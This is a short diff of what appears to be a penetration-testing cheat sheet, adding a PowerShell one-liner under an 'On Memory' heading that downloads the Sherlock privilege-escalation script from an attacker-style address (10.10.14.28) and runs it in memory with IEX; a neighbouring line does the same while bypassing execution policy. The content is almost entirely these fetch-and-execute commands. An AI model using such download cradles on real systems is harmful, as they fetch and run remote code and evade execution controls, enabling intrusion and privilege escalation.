@@ -46,6 +46,7 @@ Import-Module ./Sherlock.ps1
 Find-AllVulns
 
 # On Memory
+IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.28/Sherlock.ps1');
 powershell.exe -exec bypass IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.28/Sherlock.ps1');
 
 ==============================================================================
